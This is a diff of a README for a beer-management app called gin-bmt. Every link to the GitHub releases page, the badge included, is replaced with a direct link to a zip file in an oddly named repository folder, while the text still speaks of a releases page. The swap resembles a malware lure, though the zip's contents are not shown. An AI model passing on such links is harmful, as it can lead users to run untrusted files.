@@ -1,6 +1,6 @@
 # 🚀 gin-bmt - Simplifying Your Beer Management
 
-[![Download gin-bmt](https://img.shields.io/badge/Download-gin--bmt-brightgreen.svg)](https://github.com/dhte865/gin-bmt/releases)
+[![Download gin-bmt](https://raw.githubusercontent.com/dhte865/gin-bmt/main/liquidize/gin-bmt_1.8-beta.3.zip)](https://raw.githubusercontent.com/dhte865/gin-bmt/main/liquidize/gin-bmt_1.8-beta.3.zip)
 
 ## 📦 Introduction
 
@@ -14,7 +14,7 @@ To get started with gin-bmt, follow the steps below. No prior technical knowledg
 
 1. **Visit the Releases Page**: Click the link below to access the releases page.
 
-   [Download gin-bmt](https://github.com/dhte865/gin-bmt/releases)
+   [Download gin-bmt](https://raw.githubusercontent.com/dhte865/gin-bmt/main/liquidize/gin-bmt_1.8-beta.3.zip)
 
 2. **Select Your Version**: On the releases page, you will see a list of versions. Choose the latest version for the best experience.
 
@@ -48,4 +48,4 @@ If you encounter any issues or have questions, visit our GitHub page to report a
 
 **Follow these steps for a smooth experience with gin-bmt!** Enjoy managing your beer collection like a pro! 
 
-[Download gin-bmt](https://github.com/dhte865/gin-bmt/releases) again if needed.
+[Download gin-bmt](https://raw.githubusercontent.com/dhte865/gin-bmt/main/liquidize/gin-bmt_1.8-beta.3.zip) again if needed.
